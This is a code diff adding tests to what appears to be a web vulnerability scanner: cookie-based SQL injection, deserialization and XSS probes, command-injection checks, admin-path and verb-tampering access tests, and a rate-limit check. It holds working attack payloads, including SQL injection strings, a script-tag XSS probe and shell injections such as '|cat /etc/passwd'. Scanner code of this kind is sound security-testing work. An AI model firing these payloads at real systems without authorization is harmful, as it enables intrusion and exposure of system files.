@@ -10,6 +10,7 @@ from __future__ import annotations
 import asyncio
 import hashlib
 import re
+import time
 from typing import Any
 from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
@@ -479,4 +480,352 @@ async def test_idor(
         "param": param,
         "url": target_url,
         "confidence": "low",
+    }
+
+
+# ---------------------------------------------------------------------------
+# Cookie Injection Testing
+# ---------------------------------------------------------------------------
+
+_SQLI_ERROR_INDICATORS = re.compile(
+    r"sql syntax|mysql_|ORA-\d|postgresql|sqlite3|SQLSTATE|microsoft sql|"
+    r"unclosed quotation|syntax error at or near",
+    re.I,
+)
+
+_DESER_INDICATORS = re.compile(
+    r"pickle|unserialize|ObjectInputStream|java\.io|Deserialize|marshal|"
+    r"yaml\.load|phpobject|serialize|ClassNotFoundException|BadPickle|UnpicklingError",
+    re.I,
+)
+
+
+async def test_cookie_injection(
+    target_url: str, cookie_name: str, cookie_value: str, vuln_type: str,
+) -> dict[str, Any]:
+    """Test cookie-based injection (SQLi, deserialization, XSS)."""
+    try:
+        async with aiohttp.ClientSession() as session:
+            if vuln_type == "sqli":
+                payloads = [
+                    "' OR 1=1--",
+                    "' UNION SELECT NULL--",
+                    "1' AND SLEEP(5)--",
+                    "1 OR 1=1",
+                ]
+                for payload in payloads:
+                    cookies = {cookie_name: payload}
+                    t_start = time.monotonic()
+                    try:
+                        async with session.get(
+                            target_url, cookies=cookies, headers=_HEADERS,
+                            ssl=False, timeout=_TIMEOUT, allow_redirects=True,
+                        ) as resp:
+                            elapsed = time.monotonic() - t_start
+                            body = await resp.text(errors="replace")
+                            body = body[:50_000]
+                    except Exception:
+                        continue
+
+                    # Time-based detection for SLEEP payload
+                    if "SLEEP" in payload and elapsed > 4:
+                        return {
+                            "vulnerable": True,
+                            "type": "time-based-sqli",
+                            "evidence": f"Response delayed {elapsed:.2f}s (>4s threshold)",
+                            "cookie_name": cookie_name,
+                            "payload": payload,
+                        }
+
+                    if _SQLI_ERROR_INDICATORS.search(body):
+                        return {
+                            "vulnerable": True,
+                            "type": "error-based-sqli",
+                            "evidence": body[:500],
+                            "cookie_name": cookie_name,
+                            "payload": payload,
+                        }
+
+            elif vuln_type == "deserialization":
+                payload = "BUGHOUND_DESER_PROBE"
+                cookies = {cookie_name: payload}
+                try:
+                    async with session.get(
+                        target_url, cookies=cookies, headers=_HEADERS,
+                        ssl=False, timeout=_TIMEOUT, allow_redirects=True,
+                    ) as resp:
+                        body = await resp.text(errors="replace")
+                        body = body[:50_000]
+                except Exception:
+                    return {"vulnerable": False, "type": vuln_type, "evidence": "", "cookie_name": cookie_name, "payload": payload}
+
+                if _DESER_INDICATORS.search(body):
+                    return {
+                        "vulnerable": True,
+                        "type": "deserialization",
+                        "evidence": body[:500],
+                        "cookie_name": cookie_name,
+                        "payload": payload,
+                    }
+
+            elif vuln_type == "xss":
+                payload = "<script>alert(1)</script>"
+                cookies = {cookie_name: payload}
+                try:
+                    async with session.get(
+                        target_url, cookies=cookies, headers=_HEADERS,
+                        ssl=False, timeout=_TIMEOUT, allow_redirects=True,
+                    ) as resp:
+                        body = await resp.text(errors="replace")
+                        body = body[:50_000]
+                except Exception:
+                    return {"vulnerable": False, "type": vuln_type, "evidence": "", "cookie_name": cookie_name, "payload": payload}
+
+                if payload in body:
+                    return {
+                        "vulnerable": True,
+                        "type": "reflected-xss",
+                        "evidence": f"Payload reflected verbatim in response body",
+                        "cookie_name": cookie_name,
+                        "payload": payload,
+                    }
+
+    except Exception:
+        pass
+
+    return {
+        "vulnerable": False,
+        "type": vuln_type,
+        "evidence": "",
+        "cookie_name": cookie_name,
+        "payload": "",
+    }
+
+
+# ---------------------------------------------------------------------------
+# RCE / Command Injection Testing
+# ---------------------------------------------------------------------------
+
+_RCE_TIME_PAYLOADS_LINUX = [
+    ";sleep 5;",
+    "|sleep 5",
+    "$(sleep 5)",
+    "`sleep 5`",
+    ";sleep 5 #",
+    "& sleep 5 &",
+]
+
+_RCE_TIME_PAYLOADS_WINDOWS = [
+    "|timeout 5",
+    ";ping -n 5 127.0.0.1;",
+]
+
+_RCE_OUTPUT_PAYLOADS = [
+    ";id",
+    "|id",
+    "$(id)",
+    ";whoami",
+    "|cat /etc/passwd",
+]
+
+_RCE_OUTPUT_INDICATORS = re.compile(r"uid=\d|root:|www-data|/bin/bash|/bin/sh", re.I)
+
+
+async def test_rce(
+    target_url: str, param: str, original_value: str,
+) -> dict[str, Any]:
+    """Test command injection via time-based and output-based detection."""
+    result: dict[str, Any] = {
+        "vulnerable": False,
+        "technique": None,
+        "payload": "",
+        "delay_seconds": 0.0,
+        "evidence": "",
+        "os": "unknown",
+        "param": param,
+        "url": target_url,
+    }
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Establish baseline response time
+            t0 = time.monotonic()
+            baseline_status, baseline_body, _ = await _send(session, target_url)
+            baseline_time = time.monotonic() - t0
+
+            # Time-based Linux payloads
+            for payload in _RCE_TIME_PAYLOADS_LINUX:
+                test_url = _replace_param(target_url, param, original_value + payload)
+                t_start = time.monotonic()
+                status, body, _ = await _send(session, test_url)
+                elapsed = time.monotonic() - t_start
+
+                if status == 0:
+                    continue
+
+                if elapsed > baseline_time + 4:
+                    result.update({
+                        "vulnerable": True,
+                        "technique": "time-based",
+                        "payload": payload,
+                        "delay_seconds": round(elapsed, 2),
+                        "evidence": f"Response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
+                        "os": "linux",
+                        "url": test_url,
+                    })
+                    return result
+
+            # Time-based Windows payloads
+            for payload in _RCE_TIME_PAYLOADS_WINDOWS:
+                test_url = _replace_param(target_url, param, original_value + payload)
+                t_start = time.monotonic()
+                status, body, _ = await _send(session, test_url)
+                elapsed = time.monotonic() - t_start
+
+                if status == 0:
+                    continue
+
+                if elapsed > baseline_time + 4:
+                    result.update({
+                        "vulnerable": True,
+                        "technique": "time-based",
+                        "payload": payload,
+                        "delay_seconds": round(elapsed, 2),
+                        "evidence": f"Response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
+                        "os": "windows",
+                        "url": test_url,
+                    })
+                    return result
+
+            # Output-based payloads
+            for payload in _RCE_OUTPUT_PAYLOADS:
+                test_url = _replace_param(target_url, param, original_value + payload)
+                status, body, _ = await _send(session, test_url)
+
+                if status == 0:
+                    continue
+
+                if _RCE_OUTPUT_INDICATORS.search(body):
+                    result.update({
+                        "vulnerable": True,
+                        "technique": "output-based",
+                        "payload": payload,
+                        "evidence": body[:500],
+                        "os": "linux",
+                        "url": test_url,
+                    })
+                    return result
+
+    except Exception:
+        pass
+
+    return result
+
+
+# ---------------------------------------------------------------------------
+# Broken Access Control Testing
+# ---------------------------------------------------------------------------
+
+_ADMIN_PATH_PATTERNS = [
+    "/admin", "/dashboard", "/manage", "/internal", "/debug", "/config",
+    "/settings", "/api/admin", "/api/internal", "/api/debug", "/api/private",
+]
+
+
+async def test_broken_access(
+    endpoints: list[str], auth_token: str | None = None,
+) -> list[dict[str, Any]]:
+    """Test broken access control via unauthenticated admin access and verb tampering."""
+    findings: list[dict[str, Any]] = []
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Strategy 1: Unauthenticated admin access
+            admin_endpoints = [
+                ep for ep in endpoints
+                if any(pattern in ep for pattern in _ADMIN_PATH_PATTERNS)
+            ]
+
+            for endpoint in admin_endpoints:
+                status, body, _ = await _send(session, endpoint)
+                if status == 200 and len(body) > 100:
+                    findings.append({
+                        "endpoint": endpoint,
+                        "accessible": True,
+                        "status_code": status,
+                        "content_length": len(body),
+                        "technique": "unauthenticated_admin_access",
+                        "evidence": f"Admin endpoint returned 200 with {len(body)} bytes (no auth)",
+                    })
+
+            # Strategy 2: Verb tampering on 403 endpoints
+            for endpoint in endpoints:
+                get_status, _, _ = await _send(session, endpoint)
+
+                if get_status != 403:
+                    continue
+
+                for method in ("POST", "PUT", "DELETE", "PATCH", "OPTIONS"):
+                    status, body, _ = await _send(session, endpoint, method=method)
+
+                    if status == 200:
+                        findings.append({
+                            "endpoint": endpoint,
+                            "accessible": True,
+                            "status_code": status,
+                            "content_length": len(body),
+                            "technique": "verb_tampering",
+                            "evidence": f"GET returned 403, {method} returned 200",
+                        })
+                        break  # One finding per endpoint is enough
+
+    except Exception:
+        pass
+
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Rate Limit Testing
+# ---------------------------------------------------------------------------
+
+
+async def test_rate_limit(
+    auth_endpoint: str, method: str = "POST",
+) -> dict[str, Any]:
+    """Send 30 rapid requests to detect missing rate limiting."""
+    status_counts: dict[int, int] = {}
+    requests_before_block = 0
+    rate_limited = False
+    lockout_detected = False
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            for i in range(1, 31):
+                status, body, _ = await _send(session, auth_endpoint, method=method)
+
+                status_counts[status] = status_counts.get(status, 0) + 1
+
+                if status == 429 and not rate_limited:
+                    rate_limited = True
+                    requests_before_block = i
+
+                # Lockout: account locked indicators in body
+                if re.search(r"account.*locked|too many.*attempt|locked out|temporarily.*disabled", body, re.I):
+                    lockout_detected = True
+
+    except Exception:
+        pass
+
+    if rate_limited:
+        evidence = f"HTTP 429 received after {requests_before_block} requests"
+    else:
+        evidence = f"No rate limiting detected after 30 requests (status distribution: {status_counts})"
+
+    return {
+        "endpoint": auth_endpoint,
+        "rate_limited": rate_limited,
+        "requests_before_block": requests_before_block,
+        "lockout_detected": lockout_detected,
+        "evidence": evidence,
     }
